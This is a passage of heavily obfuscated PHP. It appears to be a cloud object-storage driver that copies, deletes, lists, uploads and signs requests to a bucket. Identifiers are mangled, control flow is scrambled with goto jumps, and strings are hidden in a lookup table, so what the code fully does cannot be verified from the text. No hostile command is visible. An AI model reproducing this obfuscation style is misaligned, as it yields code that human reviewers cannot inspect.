$Bœ‡“ÂØÙÆ = $this->client->copyObject($this->bucket, $a—¦ğÕäĞî, $this->bucket, $c¾¼äŒË¦, $eÑùâø†®[202], $EÖä„°°ø); } else { $Bœ‡“ÂØÙÆ = $this->client->multiCopyObject($this->bucket, $a—¦ğÕäĞî, $this->bucket, $c¾¼äŒË¦, $EÖä„°°ø); } $Bœ‡“ÂØÙÆ = $Bœ‡“ÂØÙÆ ? $this->getPathOuter($c¾¼äŒË¦) : !1; return $Bœ‡“ÂØÙÆ; } public function moveFile($cêìŞæ…¢, $C¬†êôÇ¦â) { if ($this->copyFile($cêìŞæ…¢, $C¬†êôÇ¦â)) { $this->delFile($cêìŞæ…¢); return $this->getPathOuter($C¬†êôÇ¦â); } return !1; } public function delFile($aË”¾Œ·Şº) { return $this->client->deleteObject($this->bucket, $aË”¾Œ·Şº); } public function delFolder($Dİ¹Èğó®˜) { goto c‚çÏ´ÍÍÊ; EŒŒŸ¶ŒÙ: if (!empty($Dİ¹Èğó®˜) && $Dİ¹Èğó®˜ !== $d”‚ô«ƒ´Á[201] && !in_array($DÊªÆ®ñŸ„, $dù®»Œˆï[$d”‚ô«ƒ´Á[85]])) { $dù®»Œˆï[$d”‚ô«ƒ´Á[85]][] = $DÊªÆ®ñŸ„; } $eÖÏ¢ä¦å‚ = $this->delByBatch($dù®»Œˆï[$d”‚ô«ƒ´Á[84]]); if (!$eÖÏ¢ä¦å‚) { return !1; } goto C˜Ò—ô²Åá; c‚çÏ´ÍÍÊ: $d”‚ô«ƒ´Á =& $_SERVER[£¶ä½¶¢]; if (!$this->exist($Dİ¹Èğó®˜)) { return !0; } $this->listItemCache = !1; goto A¡ƒİŠÆ‰™; A¡ƒİŠÆ‰™: $dù®»Œˆï = $this->fileList($Dİ¹Èğó®˜); $this->listItemCache = !0; $DÊªÆ®ñŸ„ = trim($Dİ¹Èğó®˜, $d”‚ô«ƒ´Á[18]) . $d”‚ô«ƒ´Á[18]; goto EŒŒŸ¶ŒÙ; C˜Ò—ô²Åá: $eÖÏ¢ä¦å‚ = $this->delByBatch($dù®»Œˆï[$d”‚ô«ƒ´Á[85]]); if (!$eÖÏ¢ä¦å‚) { return !1; } return $this->delFile($DÊªÆ®ñŸ„); goto f°š»òî¬º; f°š»òî¬º: } private function delByBatch($fˆ´‰µ–) { foreach (array_chunk($fˆ´‰µ–, 1000) as $EĞİ”¬„óŸ) { $aÎŠ„ŠóŒ½ = $this->client->deleteObjects($this->bucket, $EĞİ”¬„óŸ); if (!$aÎŠ„ŠóŒ½) { return !1; } } return !0; } public function rename($eøâòÜƒÀ¾, $B·Û®ˆ Ë™) { return $this->renameObject($eøâòÜƒÀ¾, $B·Û®ˆ Ë™); } public function listPath($BñÄÉåÄ’, $dÖÙ¸‘å… = false) { $E¹‘¢à… =& $_SERVER[£¶ä½¶¢]; $Dä ì¾ã = $this->fileList($BñÄÉåÄ’, $E¹‘¢à…[18], !0); foreach ($Dä ì¾ã[$E¹‘¢à…[85]] as $d§çÆµÀ©… => $A¶©¸èøºù) { $Dä ì¾ã[$E¹‘¢à…[85]][$d§çÆµÀ©…] = $this->folderInfo($A¶©¸èøºù, $dÖÙ¸‘å…); } foreach ($Dä ì¾ã[$E¹‘¢à…[84]] as $d§çÆµÀ©… => $A¶©¸èøºù) { $Dä ì¾ã[$E¹‘¢à…[84]][$d§çÆµÀ©…] = $this->fileInfo($A¶©¸èøºù[$E¹‘¢à…[38]], $dÖÙ¸‘å…, $A¶©¸èøºù); } return $Dä ì¾ã; } private function fileInfo($fŒâ·ŒÖÇà, $eƒŒ†©Ôã = false, $B®–ŒåÁäÂ = array()) { goto CÒ«‚Ã§œ; CÒ«‚Ã§œ: $aÖÁô¢èÚ =& $_SERVER[£¶ä½¶¢]; $DñˆŞÇ¢ = array($aÖÁô¢èÚ[38] => $this->pathThis($fŒâ·ŒÖÇà), $aÖÁô¢èÚ[86] => $this->getPathOuter($fŒâ·ŒÖÇà), $aÖÁô¢èÚ[39] => $aÖÁô¢èÚ[203], $aÖÁô¢èÚ[178] => $this->ext($fŒâ·ŒÖÇà), $aÖÁô¢èÚ[88] => isset($B®–ŒåÁäÂ[$aÖÁô¢èÚ[88]]) ? $B®–ŒåÁäÂ[$aÖÁô¢èÚ[88]] : 0); if ($eƒŒ†©Ôã) { return $DñˆŞÇ¢; } goto cô‹ºåÙ”; F‡é‘İé³: if (isset($B®–ŒåÁäÂ[$aÖÁô¢èÚ[207]])) { $DñˆŞÇ¢[$aÖÁô¢èÚ[94]] = $B®–ŒåÁäÂ[$aÖÁô¢èÚ[207]]; } if (isset($B®–ŒåÁäÂ[$aÖÁô¢èÚ[88]])) { $DñˆŞÇ¢[$aÖÁô¢èÚ[88]] = $B®–ŒåÁäÂ[$aÖÁô¢èÚ[88]]; } return $DñˆŞÇ¢; goto bîª¶ÉĞÉ; cô‹ºåÙ”: $DñˆŞÇ¢[$aÖÁô¢èÚ[204]] = $DñˆŞÇ¢[$aÖÁô¢èÚ[94]] = 0; $DñˆŞÇ¢[$aÖÁô¢èÚ[205]] = $DñˆŞÇ¢[$aÖÁô¢èÚ[206]] = !0; if (empty($B®–ŒåÁäÂ)) { $B®–ŒåÁäÂ = $this->objectMeta($fŒâ·ŒÖÇà); if (!$B®–ŒåÁäÂ) { return $DñˆŞÇ¢; } } goto F‡é‘İé³; bîª¶ÉĞÉ: } private function folderInfo($e¹ƒğ×†‰, $A‘ ïÚ·™ç = false) { goto D‹¿®›ğ™; A¡ÏöÄõÒ: $e¹ƒğ×†‰ = trim($e¹ƒğ×†‰, $aâ´Ç¶‘‚×[18]) . $aâ´Ç¶‘‚×[18]; $cîâ–ğ°’ = $this->objectMeta($e¹ƒğ×†‰); if (isset($cîâ–ğ°’[$aâ´Ç¶‘‚×[207]])) { $Få„½½‚«ˆ[$aâ´Ç¶‘‚×[204]] = $cîâ–ğ°’[$aâ´Ç¶‘‚×[207]]; } goto Cè±–Ú¯½â; d’¹Ç´ëÊ˜: $Få„½½‚«ˆ[$aâ´Ç¶‘‚×[204]] = $Få„½½‚«ˆ[$aâ´Ç¶‘‚×[94]] = 0; $Få„½½‚«ˆ[$aâ´Ç¶‘‚×[205]] = $Få„½½‚«ˆ[$aâ´Ç¶‘‚×[206]] = !0; if ($e¹ƒğ×†‰ == $aâ´Ç¶‘‚×[43]) { return $Få„½½‚«ˆ; } goto A¡ÏöÄõÒ; D‹¿®›ğ™: $aâ´Ç¶‘‚× =& $_SERVER[£¶ä½¶¢]; $Få„½½‚«ˆ = array($aâ´Ç¶‘‚×[38] => $this->pathThis($e¹ƒğ×†‰), $aâ´Ç¶‘‚×[86] => $this->getPathOuter($aâ´Ç¶‘‚×[18] . $e¹ƒğ×†‰), $aâ´Ç¶‘‚×[39] => $aâ´Ç¶‘‚×[87]); if ($A‘ ïÚ·™ç) { return $Få„½½‚«ˆ; } goto d’¹Ç´ëÊ˜; Cè±–Ú¯½â: return $Få„½½‚«ˆ; goto Dˆ¤–×Ò·–; Dˆ¤–×Ò·–: } private function fileList($AÎŒ¶á½»Ú, $D¶Ç¥ôôÇã = '', $b²¡ø†ëĞ¿ = 0) { goto C¢š«›Ôï; dË…÷Ã„Ö±: if (!$FÄÕ©ªšó) { return array($FÆÈªÖŠ [85] => array(), $FÆÈªÖŠ [84] => array()); } $EÄêñÛ‡ø¢ = $this->listItemCache === !1 ? !1 : !0; $b„ìŸ¼Õ» = $b½ÀŞÒù¤µ = array(); goto C¹ …’Š; C¢š«›Ôï: $FÆÈªÖŠ  =& $_SERVER[£¶ä½¶¢]; $Bã¶½ƒÕ = rtrim($AÎŒ¶á½»Ú, $FÆÈªÖŠ [18]) . $FÆÈªÖŠ [18]; $FÄÕ©ªšó = $this->listObjs($Bã¶½ƒÕ, null, null, $D¶Ç¥ôôÇã); goto dË…÷Ã„Ö±; C¹ …’Š: foreach ($FÄÕ©ªšó[$FÆÈªÖŠ [208]] as $D¬Í³¿¼‹®) { goto d›Ï×ùÛàœ; F¥˜Ò‘ªø²: $b½ÀŞÒù¤µ[] = $b²¡ø†ëĞ¿ ? $D¬Í³¿¼‹® : $Eõù×òç‘‰; goto Dç……‹ ÃÑ; bÔÄíµóªù: $CùÕ§ÕİÅÔ = $e¥ÄèšÃ†‡ == 0 && substr($Eõù×òç‘‰, strlen($Eõù×òç‘‰) - 1, 1) == $FÆÈªÖŠ [18] ? !0 : !1; if ($EÄêñÛ‡ø¢) { $this->cacheMethod($FÆÈªÖŠ [209], $Eõù×òç‘‰, $CùÕ§ÕİÅÔ); $this->cacheMethod($FÆÈªÖŠ [210], $Eõù×òç‘‰, $D¬Í³¿¼‹®); } if ($CùÕ§ÕİÅÔ) { $b„ìŸ¼Õ»[] = $Eõù×òç‘‰; continue; } goto F¥˜Ò‘ªø²; d›Ï×ùÛàœ: $Eõù×òç‘‰ = $D¬Í³¿¼‹®[$FÆÈªÖŠ [38]]; if ($Eõù×òç‘‰ == $Bã¶½ƒÕ) { continue; } $e¥ÄèšÃ†‡ = isset($D¬Í³¿¼‹®[$FÆÈªÖŠ [88]]) ? $D¬Í³¿¼‹®[$FÆÈªÖŠ [88]] : 0; goto bÔÄíµóªù; Dç……‹ ÃÑ: } foreach ($FÄÕ©ªšó[$FÆÈªÖŠ [211]] as $D¬Í³¿¼‹®) { $b„ìŸ¼Õ»[] = $D¬Í³¿¼‹®[$FÆÈªÖŠ [38]]; if ($EÄêñÛ‡ø¢) { $this->cacheMethod($FÆÈªÖŠ [209], $D¬Í³¿¼‹®[$FÆÈªÖŠ [38]], !0); } } if ($EÄêñÛ‡ø¢) { $this->cacheMethod($FÆÈªÖŠ [209], $AÎŒ¶á½»Ú, !0); } goto aÄÂôî†«; aÄÂôî†«: return array($FÆÈªÖŠ [85] => $b„ìŸ¼Õ», $FÆÈªÖŠ [84] => $b½ÀŞÒù¤µ); goto DöÆİë‡Š; DöÆİë‡Š: } private function listObjs($FÅĞùÈªœ, $aØ¶¼¾ÚŞœ = null, $B‚µÎ×İ…˜ = null, $D´óï‘Õ°Ş = null) { $Déâ²ˆ–õÉ =& $_SERVER[£¶ä½¶¢]; $FÅĞùÈªœ = trim($FÅĞùÈªœ, $Déâ²ˆ–õÉ[18]); $CÂøÓÚŠ‘¡ = empty($FÅĞùÈªœ) && $FÅĞùÈªœ !== $Déâ²ˆ–õÉ[201] ? $Déâ²ˆ–õÉ[43] : $FÅĞùÈªœ . $Déâ²ˆ–õÉ[18]; return $this->client->getBucket($this->bucket, $CÂøÓÚŠ‘¡, $aØ¶¼¾ÚŞœ, $B‚µÎ×İ…˜, $D´óï‘Õ°Ş, !0); } public function has($b÷ãˆ¹êƒ, $C®îğ¼â›‰ = false, $d•à´ê¡âÅ = true) { goto d¼é„Œ¿«Ù; d¼é„Œ¿«Ù: $E„Ñó¢Æİ =& $_SERVER[£¶ä½¶¢]; $b÷ãˆ¹êƒ = trim($b÷ãˆ¹êƒ, $E„Ñó¢Æİ[18]); $A·ß½²¨æ¤ = empty($b÷ãˆ¹êƒ) && $b÷ãˆ¹êƒ !== $E„Ñó¢Æİ[201] ? $E„Ñó¢Æİ[43] : $b÷ãˆ¹êƒ . $E„Ñó¢Æİ[18]; goto cÈÂÌÇ‡¡ï; b¯Œíìáø: $eŞºÕä¼ÎÖ = $FĞ”ô¡‹·ß = array(); while (!0) { $C´ÇÄ¶Üˆœ = $this->listObjs($b÷ãˆ¹êƒ, $C–®ĞÖ›Òß, $Fñê‰ŠËè, $D´ƒœ’‡„); if (!$C´ÇÄ¶Üˆœ) { break; } $C–®ĞÖ›Òß = $C´ÇÄ¶Üˆœ[$E„Ñó¢Æİ[212]]; $dÇ‰éç•Øğ = $C´ÇÄ¶Üˆœ[$E„Ñó¢Æİ[208]]; $f¥òº’ƒ× = $C´ÇÄ¶Üˆœ[$E„Ñó¢Æİ[211]]; if (empty($dÇ‰éç•Øğ) && empty($f¥òº’ƒ×)) { break; } if (count($dÇ‰éç•Øğ) == 1 && $dÇ‰éç•Øğ[0][$E„Ñó¢Æİ[38]] == $A·ß½²¨æ¤) { break; } if ($C®îğ¼â›‰) { if (count($dÇ‰éç•Øğ)) { $dÇ‰éç•Øğ = array_column($dÇ‰éç•Øğ, $E„Ñó¢Æİ[38]); $eŞºÕä¼ÎÖ = array_merge($eŞºÕä¼ÎÖ, $dÇ‰éç•Øğ); } if (count($f¥òº’ƒ×)) { $f¥òº’ƒ× = array_column($f¥òº’ƒ×, $E„Ñó¢Æİ[38]); $FĞ”ô¡‹·ß = array_merge($FĞ”ô¡‹·ß, $f¥òº’ƒ×); } if ($C–®ĞÖ›Òß === null) { break; } continue; } if ($d•à´ê¡âÅ) { if (!empty($dÇ‰éç•Øğ)) { if (count($dÇ‰éç•Øğ) > 1 || isset($dÇ‰éç•Øğ[0][$E„Ñó¢Æİ[38]]) && $dÇ‰éç•Øğ[0][$E„Ñó¢Æİ[38]] != $A·ß½²¨æ¤) { return !0; } } } else { if (!empty($f¥òº’ƒ×)) { return !0; } } if ($C–®ĞÖ›Òß === null) { break; } } if ($C®îğ¼â›‰) { $eŞºÕä¼ÎÖ = array_diff($eŞºÕä¼ÎÖ, array($A·ß½²¨æ¤)); $eŞºÕä¼ÎÖ = count(array_unique($eŞºÕä¼ÎÖ)); $FĞ”ô¡‹·ß = count(array_unique($FĞ”ô¡‹·ß)); return array($E„Ñó¢Æİ[213] => $eŞºÕä¼ÎÖ, $E„Ñó¢Æİ[214] => $FĞ”ô¡‹·ß); } goto Eâ‹ìºÚŠš; cÈÂÌÇ‡¡ï: $C–®ĞÖ›Òß = null; $Fñê‰ŠËè = 500; $D´ƒœ’‡„ = $E„Ñó¢Æİ[18]; goto b¯Œíìáø; Eâ‹ìºÚŠš: return !1; goto dÙÇˆª–Æß; dÙÇˆª–Æß: } public function listAll($DŸ®ËõÙõ) { $a“ß»ËÀ‰… =& $_SERVER[£¶ä½¶¢]; $EïÓô ÄÁÔ = $this->fileList($DŸ®ËõÙõ, $a“ß»ËÀ‰…[43], !0); $fÄóí„¨¢î = array(); foreach ($EïÓô ÄÁÔ[$a“ß»ËÀ‰…[84]] as $böäÚ¿ÂË¥) { $fÄóí„¨¢î[$böäÚ¿ÂË¥[$a“ß»ËÀ‰…[38]]] = $böäÚ¿ÂË¥[$a“ß»ËÀ‰…[88]]; } foreach ($EïÓô ÄÁÔ[$a“ß»ËÀ‰…[85]] as $böäÚ¿ÂË¥) { if (is_string($böäÚ¿ÂË¥)) { $fÄóí„¨¢î[$böäÚ¿ÂË¥] = 0; } } return $this->listAllFiles($DŸ®ËõÙõ, array_keys($fÄóí„¨¢î), $fÄóí„¨¢î); } public function canRead($c‹»³‰×Ú‡) { $bÖ°±ÂŸïÛ =& $_SERVER[£¶ä½¶¢]; $BŠã‡‚¥è  = $this->client->getAccessControlPolicy($this->bucket, $c‹»³‰×Ú‡); if (!$BŠã‡‚¥è ) { return !1; } return in_array($BŠã‡‚¥è , array($bÖ°±ÂŸïÛ[215], $bÖ°±ÂŸïÛ[216], $bÖ°±ÂŸïÛ[217])) ? !0 : !1; } public function canWrite($C»½­ë£à) { $CŸ±©ãç©… =& $_SERVER[£¶ä½¶¢]; $C‹ß±“‰¦¹ = $this->client->getAccessControlPolicy($this->bucket, $C»½­ë£à); if (!$C‹ß±“‰¦¹) { return !1; } return in_array($C‹ß±“‰¦¹, array($CŸ±©ãç©…[215], $CŸ±©ãç©…[216])) ? !0 : !1; } public function getContent($Aë¦»Ôê¬) { return $this->client->getObject($this->bucket, $Aë¦»Ôê¬); } public function setContent($DÒñ¥½¸ƒâ, $b‘š‡Ìù = '', $DÙêî³¼ˆñ = false) { goto aãæºŒãœ; aãæºŒãœ: $BÈ½–Şí­ó =& $_SERVER[£¶ä½¶¢]; $DÒñ¥½¸ƒâ = $DÙêî³¼ˆñ ? trim($DÒñ¥½¸ƒâ, $BÈ½–Şí­ó[18]) . $BÈ½–Şí­ó[18] : $DÒñ¥½¸ƒâ; $aå»Ì‚ìâÆ = get_file_mime(get_path_ext($DÒñ¥½¸ƒâ)); goto a¯åĞÎò†; a¯åĞÎò†: $c–áêêŒç = $this->client->putObject($b‘š‡Ìù, $this->bucket, $DÒñ¥½¸ƒâ, $BÈ½–Şí­ó[202], array(), $aå»Ì‚ìâÆ); if (!$c–áêêŒç) { return !1; } if ($DÙêî³¼ˆñ) { return !0; } goto CêŒ„ÒéŞ; CêŒ„ÒéŞ: $this->cacheMethod(null, null); $c–áêêŒç = $this->copyFile($DÒñ¥½¸ƒâ, $DÒñ¥½¸ƒâ, array($BÈ½–Şí­ó[218] => $c–áêêŒç[$BÈ½–Şí­ó[219]])); return $c–áêêŒç ? !0 : !1; goto CÙÎ¸óá“«; CÙÎ¸óá“«: } public function fileSubstr($B›˜êÆÊª”, $BóæÏÓ‡¸’, $fÙ³óµâ‚) { $DİÂÊ¤…’ª = $BóæÏÓ‡¸’ + $fÙ³óµâ‚ - 1; return $this->client->getObject($this->bucket, $B›˜êÆÊª”, array($_SERVER[£¶ä½¶¢][220] => "\x62\x79\164\145\x73\x3d{$BóæÏÓ‡¸’}\x2d{$DİÂÊ¤…’ª}")); } public function upload($EÖ»ñˆĞÂö, $c‹î…œçãĞ, $E¬¿¸²Á¬Î = false, $cíÅ”Ïë = REPEAT_REPLACE) { $CÅèƒÔïÑ =& $_SERVER[£¶ä½¶¢]; $cÜ¸×œÊ† = array($CÅèƒÔïÑ[218] => @md5_file($c‹î…œçãĞ)); $EóãĞ“øñè = array($CÅèƒÔïÑ[221] => get_file_mime(get_path_ext($EÖ»ñˆĞÂö))); if (IO::size($c‹î…œçãĞ) <= 1024 * 1024 * 200) { $fÁã¸„ğÎ = $this->client->putObjectFile($c‹î…œçãĞ, $this->bucket, $EÖ»ñˆĞÂö, $CÅèƒÔïÑ[202], $cÜ¸×œÊ†, $EóãĞ“øñè); return !empty($fÁã¸„ğÎ) ? $this->getPathOuter($EÖ»ñˆĞÂö) : !1; } $E¨ëšß¸ãÄ = $this->client->multiUploadObject($c‹î…œçãĞ, $this->bucket, trim($EÖ»ñˆĞÂö, $CÅèƒÔïÑ[18]), $cÜ¸×œÊ†, $EóãĞ“øñè); return $E¨ëšß¸ãÄ ? $this->getPathOuter($EÖ»ñˆĞÂö) : !1; } public function download($e¨©¶Ö¹æ, $f‚Ø£Ø¦ÂÛ) { if (!@is_dir($this->pathFather($f‚Ø£Ø¦ÂÛ)) && !IO::mkdir($this->pathFather($f‚Ø£Ø¦ÂÛ))) { return !1; } $a¥óµ‡Öã = $this->client->getObject($this->bucket, $e¨©¶Ö¹æ, array(), $f‚Ø£Ø¦ÂÛ); return $a¥óµ‡Öã !== !1 ? $f‚Ø£Ø¦ÂÛ : !1; } public function link($F‘ñõ¶™¯, $b”·‰µğÉæ = array()) { $aåìÀæáãĞ =& $_SERVER[£¶ä½¶¢]; if ($this->signVer == $aåìÀæáãĞ[222]) { return $this->client->getAuthenticatedURL($this->bucket, $F‘ñõ¶™¯, 3600 * 12, $b”·‰µğÉæ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($F‘ñõ¶™¯, $aåìÀæáãĞ[18]), 3600 * 12, $this->region, array(), !0, $b”·‰µğÉæ); } public function fileOut($AšëÚŸÆù¾, $dÜÎšƒ×Ë‚ = false, $AÍ­ëÃÇ”  = false, $e“§ó¦‚ = '') { goto b‡Ë¬á÷Ô²; cœ êàµ½: $eîÜââ×İ = array($cÒ©±Ó”Ø±[226] => $dÜÎšƒ×Ë‚ . $cÒ©±Ó”Ø±[227] . rawurlencode($AÍ­ëÃÇ” ), $cÒ©±Ó”Ø±[228] => $d—­Ó™ìÍº); $b‚š±­¥éË = $this->link($AšëÚŸÆù¾, $eîÜââ×İ); $this->fileOutLink($b‚š±­¥éË); goto BÄÌ†ğãÆÅ; f”¡êŸ¹æ‡: $d—­Ó™ìÍº = get_file_mime(get_path_ext($AÍ­ëÃÇ” )); if ($d—­Ó™ìÍº == $cÒ©±Ó”Ø±[223]) { return parent::fileOut($AšëÚŸÆù¾, $dÜÎšƒ×Ë‚, $AÍ­ëÃÇ” , $e“§ó¦‚); } $dÜÎšƒ×Ë‚ = $dÜÎšƒ×Ë‚ ? $cÒ©±Ó”Ø±[224] : $cÒ©±Ó”Ø±[225]; goto cœ êàµ½; b‡Ë¬á÷Ô²: $cÒ©±Ó”Ø± =& $_SERVER[£¶ä½¶¢]; if ($this->isFileOutServer()) { return $this->fileOutServer($AšëÚŸÆù¾, $dÜÎšƒ×Ë‚, $AÍ­ëÃÇ” , $e“§ó¦‚); } if (!$AÍ­ëÃÇ” ) { $AÍ­ëÃÇ”  = $this->pathThis($AšëÚŸÆù¾); } goto f”¡êŸ¹æ‡; BÄÌ†ğãÆÅ: } public function fileOutServer($a“Šñ½µÂÂ, $CîÉ™‘¹¦‰ = false, $bì»‚ƒŠ÷ = false, $a«Ÿê §Í = '') { parent::fileOut($a“Šñ½µÂÂ, $CîÉ™‘¹¦‰, $bì»‚ƒŠ÷, $a«Ÿê §Í); } public function fileOutImageServer($Eº•µÒºã, $A¤½ÌˆÁÀ = 250) { parent::fileOutImage($Eº•µÒºã, $A¤½ÌˆÁÀ); } public function hashMd5($B¾«ºÌßæù, $E‹÷™Í´® = '') { $aäŒ‰ƒŠğ =& $_SERVER[£¶ä½¶¢]; $e·…ù«¼ª† = $this->objectMeta($B¾«ºÌßæù); if (!$e·…ù«¼ª†) { return !1; } $E‹÷™Í´® = $E‹÷™Í´® ? $E‹÷™Í´® : _get($e·…ù«¼ª†, $aäŒ‰ƒŠğ[229]); $E‹÷™Í´® = $E‹÷™Í´® ? $E‹÷™Í´® : _get($e·…ù«¼ª†, $aäŒ‰ƒŠğ[219], $aäŒ‰ƒŠğ[43]); return $E‹÷™Í´®; } public function uploadFormData($AùÖØ¿ñ÷, $fÁ±ÍÍÂ¨Ñ = 3600) { $Eî³Î›Ëªî =& $_SERVER[£¶ä½¶¢]; $f‹Å‰ì¸Ä» = $this->pathFather($AùÖØ¿ñ÷); $f´¦Â©³Ì‘ = $this->client->getHttpUploadPostParams($this->bucket, $f‹Å‰ì¸Ä», $Eî³Î›Ëªî[202], $fÁ±ÍÍÂ¨Ñ); return array_merge((array) $f´¦Â©³Ì‘, array($Eî³Î›Ëªî[185] => $this->getHost())); } public function multiUploadFormData($e«¾‹¿š±ù, $A ÙÁÆÚƒ = 3600) { $b±©òÚ· í =& $_SERVER[£¶ä½¶¢]; $d¤¼Ùİ÷±Î = gmdate($b±©òÚ· í[230]); $a…š½¢¢ = array(); $E­¶•×Æ = $this->client->getUploadId($this->bucket, $e«¾‹¿š±ù, $a…š½¢¢); if (!$E­¶•×Æ) { return !1; } return array($b±©òÚ· í[231] => $E­¶•×Æ, $b±©òÚ· í[185] => $this->getHost() . $b±©òÚ· í[18] . $this->pathEncode($e«¾‹¿š±ù), $b±©òÚ· í[232] => $d¤¼Ùİ÷±Î, $b±©òÚ· í[103] => $e«¾‹¿š±ù); } public function multiUploadAuthData($eà±Š…È‰, $F—†ÈšíÆß = array()) { goto b‚á¤†èê; b‚á¤†èê: $FòåŠ¾Ğ =& $_SERVER[£¶ä½¶¢]; $DâÁæÆùå = isset($F—†ÈšíÆß[$FòåŠ¾Ğ[232]]) ? $F—†ÈšíÆß[$FòåŠ¾Ğ[232]] : gmdate($FòåŠ¾Ğ[230]); $c²§ÇÚ±ÊÉ = isset($F—†ÈšíÆß[$FòåŠ¾Ğ[178]]) ? $F—†ÈšíÆß[$FòåŠ¾Ğ[178]] : $FòåŠ¾Ğ[43]; goto F¼ÌğÛ£ù¯; aáÜ¶‡‚”ã: if (strpos($c²§ÇÚ±ÊÉ, $FòåŠ¾Ğ[235]) === 0) { return array($FòåŠ¾Ğ[241] => $FğÏ–²½æŠ, $FòåŠ¾Ğ[232] => $DâÁæÆùå); } return $FğÏ–²½æŠ; goto d¹›Îà¾—å; F¼ÌğÛ£ù¯: $dîµ‡å¨Ğ— = $F—†ÈšíÆß[$FòåŠ¾Ğ[103]]; unset($F—†ÈšíÆß[$FòåŠ¾Ğ[103]]); if (isset($F—†ÈšíÆß[$FòåŠ¾Ğ[233]])) { $F—†ÈšíÆß[$FòåŠ¾Ğ[232]] = $DâÁæÆùå; return $this->listUploadParts($dîµ‡å¨Ğ—, $F—†ÈšíÆß); } goto Eá‰†ÎºñÂ; Eá‰†ÎºñÂ: $Cëè«Òå…Ş = array($FòåŠ¾Ğ[234], $FòåŠ¾Ğ[43], $FòåŠ¾Ğ[129], $FòåŠ¾Ğ[43], "\170\x2d\141\155\x7a\x2d\x64\x61\164\x65\x3a{$DâÁæÆùå}", $FòåŠ¾Ğ[18] . $this->bucket . $FòåŠ¾Ğ[18] . $this->pathEncode($dîµ‡å¨Ğ—) . $c²§ÇÚ±ÊÉ); if (strpos($c²§ÇÚ±ÊÉ, $FòåŠ¾Ğ[235]) === 0) { $Cëè«Òå…Ş[0] = $FòåŠ¾Ğ[236]; } if (isset($F—†ÈšíÆß[$FòåŠ¾Ğ[237]]) && $F—†ÈšíÆß[$FòåŠ¾Ğ[237]] == $FòåŠ¾Ğ[238]) { $Cëè«Òå…Ş[0] = $FòåŠ¾Ğ[238]; } goto e…†ç¿Ë¶; e…†ç¿Ë¶: $FƒØ££¹Ê¡ = implode($FòåŠ¾Ğ[9], $Cëè«Òå…Ş); $eçÓ¹ëÓ¨ = base64_encode(hash_hmac($FòåŠ¾Ğ[239], $FƒØ££¹Ê¡, $this->secret, !0)); $FğÏ–²½æŠ = $FòåŠ¾Ğ[240] . $this->accessKey . $FòåŠ¾Ğ[14] . $eçÓ¹ëÓ¨; goto aáÜ¶‡‚”ã; d¹›Îà¾—å: } public function listUploadParts($c®¨Ìß·“, $FĞÕ¼Ä = array()) { goto Cæš»ïã¯Ó; Cæš»ïã¯Ó: $cÌå‡Åë© =& $_SERVER[£¶ä½¶¢]; $b‹”©é«‰ = str_replace($cÌå‡Åë©[242], $cÌå‡Åë©[43], $FĞÕ¼Ä[$cÌå‡Åë©[178]]); $d¶¯¥§ÂŒ = $this->client->listParts($this->bucket, $c®¨Ìß·“, $b‹”©é«‰); goto dÎÛ¦Ğ÷¯¤; e„ó¤ƒÅâ: $eã·Ë§Éåˆ = $this->multiUploadAuthData($c®¨Ìß·“, $FĞÕ¼Ä); if (empty($eã·Ë§Éåˆ)) { return !1; } return array($cÌå‡Åë©[241] => $eã·Ë§Éåˆ, $cÌå‡Åë©[232] => $FĞÕ¼Ä[$cÌå‡Åë©[232]], $cÌå‡Åë©[243] => $d¶¯¥§ÂŒ); goto BÇÃØ‹ê„; dÎÛ¦Ğ÷¯¤: if (!$d¶¯¥§ÂŒ) { return !1; } unset($FĞÕ¼Ä[$cÌå‡Åë©[233]], $FĞÕ¼Ä[$cÌå‡Åë©[237]]); $FĞÕ¼Ä[$cÌå‡Åë©[103]] = $c®¨Ìß·“; goto e„ó¤ƒÅâ; BÇÃØ‹ê„: } public function getHost() { return parent::getHost() . $_SERVER[£¶ä½¶¢][18] . $this->bucket; } public function size($dæ¡… ×ä) { $Fœ”Ó™â¬ª = $this->objectMeta($dæ¡… ×ä); return $Fœ”Ó™â¬ª ? $Fœ”Ó™â¬ª[$_SERVER[£¶ä½¶¢][88]] : 0; } public function info($BƒÓ¦áäÁÍ) { if ($this->isFolder($BƒÓ¦áäÁÍ)) { return $this->folderInfo($BƒÓ¦áäÁÍ); } else { if ($this->isFile($BƒÓ¦áäÁÍ)) { return $this->fileInfo($BƒÓ¦áäÁÍ); } } return !1; } public function exist($aÉºï‰¥ğË) { return $this->isFile($aÉºï‰¥ğË) || $this->isFolder($aÉºï‰¥ğË); } public function isFile($a†´‰ÃËğª) { return !$this->isFolder($a†´‰ÃËğª) && $this->objectMeta($a†´‰ÃËğª); } public function isFolder($a¾–ƒšçÇÂ) { return $this->cacheMethod($_SERVER[£¶ä½¶¢][209], $a¾–ƒšçÇÂ); } protected function objectMeta($Aïìª–Ï•) { return $this->cacheMethod($_SERVER[£¶ä½¶¢][210], $Aïìª–Ï•); } protected function _objectMeta($cÄë‡Ø±¶) { $BùÇÊ¸¹­ =& $_SERVER[£¶ä½¶¢]; $cÄë‡Ø±¶ = rtrim($cÄë‡Ø±¶, $BùÇÊ¸¹­[18]); try { $DÂéÉÈ¹Ü = $this->client->getObjectInfo($this->bucket, $cÄë‡Ø±¶); if (!isset($DÂéÉÈ¹Ü[$BùÇÊ¸¹­[229]]) && isset($DÂéÉÈ¹Ü[$BùÇÊ¸¹­[244]])) { $DÂéÉÈ¹Ü[$BùÇÊ¸¹­[229]] = $DÂéÉÈ¹Ü[$BùÇÊ¸¹­[244]]; } } catch (Exception $Cæ‹ŞÇ†¼›) { $DÂéÉÈ¹Ü = !1; } if (!$DÂéÉÈ¹Ü) { } return $DÂéÉÈ¹Ü; } protected function _isFolder($DßóÔµ¡œŒ) { goto e†ò¿¬»¨ö; e÷á½ßÊ’: return !0; goto e«ÕÕ½ê“ç; e†ò¿¬»¨ö: $E£³ôŠ†¼´ =& $_SERVER[£¶ä½¶¢]; $DßóÔµ¡œŒ = rtrim($DßóÔµ¡œŒ, $E£³ôŠ†¼´[18]); if ($DßóÔµ¡œŒ == $E£³ôŠ†¼´[43] || $DßóÔµ¡œŒ == $E£³ôŠ†¼´[18]) { return !0; } goto b¸õá‰›; f¬ÛçƒÀíõ: return stripos($DŒ×¦Ãíµ, $DßóÔµ¡œŒ . $E£³ôŠ†¼´[18]) === 0 ? !0 : !1; if (substr($DŒ×¦Ãíµ, -1) == $E£³ôŠ†¼´[18]) { return !0; } if (get_path_this($DŒ×¦Ãíµ) == get_path_this($DßóÔµ¡œŒ)) { return !1; } goto e÷á½ßÊ’; 